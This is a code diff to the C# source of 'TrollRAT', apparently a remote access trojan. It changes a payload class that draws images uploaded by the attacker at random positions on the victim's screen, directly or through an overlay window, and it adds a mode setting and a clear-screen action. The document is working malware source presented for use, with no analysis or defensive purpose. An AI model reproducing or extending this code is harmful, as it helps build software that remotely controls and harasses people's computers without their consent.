@@ -6,7 +6,8 @@ using System.Speech.Synthesis;
 using System.Windows.Forms;
 using TrollRAT.Payloads;
 using TrollRAT.Server.Commands;
-using TrollRATActions;
+using TrollRATPayloads.Actions;
+using TrollRATPayloads.Utils;
 
 namespace TrollRATPayloads.Payloads
 {
@@ -196,22 +197,24 @@ namespace TrollRATPayloads.Payloads
         private PayloadSettingNumber scaleFactor = new PayloadSettingNumber(100, "Scale Factor (in %)", 1, 100, 1);
         private PayloadSettingSelectFile fileName = new PayloadSettingSelectFile(
             0, "Uploaded File Name", UploadCommand.uploadDir);
+        private PayloadSettingSelect mode = new PayloadSettingSelect(0, "Mode",
+            new string[] { "Draw Image to Screen directly", "Overlay Image on Screen" });
 
         private Random rng = new Random();
 
         private Bitmap image;
-        private Graphics screen = Graphics.FromHwnd(IntPtr.Zero);
+        private Graphics drawingArea;
 
-        public void imageChanged<t>(object sender, t selectedFile)
+        internal void imageChanged<t>(object sender, t selectedFile)
         {
-            if (image != null)
-            {
-                image.Dispose();
-                image = null;
-            }
-
             try
             {
+                if (image != null)
+                {
+                    image.Dispose();
+                    image = null;
+                }
+
                 using (Bitmap newImage = new Bitmap(fileName.selectedFilePath))
                 {
                     image = new Bitmap(newImage, new Size((int)(newImage.Width * (scaleFactor.Value / 100)),
@@ -220,27 +223,60 @@ namespace TrollRATPayloads.Payloads
             } catch (Exception) { }
         }
 
+        internal void modeChanged(object sender, int value)
+        {
+            switch (value)
+            {
+                case 0:
+                    drawingArea = OverlayWindow.ScreenGraphics;
+                    break;
+                case 1:
+                    drawingArea = OverlayWindow.OverlayGrahpics;
+                    break;
+            }
+        }
+
         public PayloadDrawImages() : base(10)
         {
             settings.Add(fileName);
             settings.Add(scaleFactor);
+            settings.Add(mode);
+
+            actions.Add(new PayloadActionClearScreen(this));
 
             imageChanged(null, 0);
+            modeChanged(null, 0);
 
             scaleFactor.SettingChanged += new PayloadSettingNumber.PayloadSettingChangeEvent(imageChanged);
             fileName.SettingChanged += new PayloadSettingSelectFile.PayloadSettingChangeEvent(imageChanged);
+            mode.SettingChanged += new PayloadSettingSelect.PayloadSettingChangeEvent(modeChanged);
 
             name = "Draw Uploaded Images";
         }
 
         protected override void execute()
         {
-            if (image != null)
+            if (image != null && drawingArea != null)
             {
-                int x = rng.Next(0, Screen.PrimaryScreen.Bounds.Width - image.Width);
-                int y = rng.Next(0, Screen.PrimaryScreen.Bounds.Height - image.Height);
+                switch (mode.Value)
+                {
+                    case 0:
+                    case 1:
+                        int x = rng.Next(0, Screen.PrimaryScreen.Bounds.Width - image.Width);
+                        int y = rng.Next(0, Screen.PrimaryScreen.Bounds.Height - image.Height);
 
-                screen.DrawImageUnscaled(image, x, y);
+                        try
+                        {
+                            drawingArea.DrawImageUnscaled(image, x, y);
+                        }
+                        catch (Exception) { }
+                        
+
+                        break;
+                }
+
+                if (mode.Value > 0)
+                    OverlayWindow.updateOverlay();
             }
         }
     }
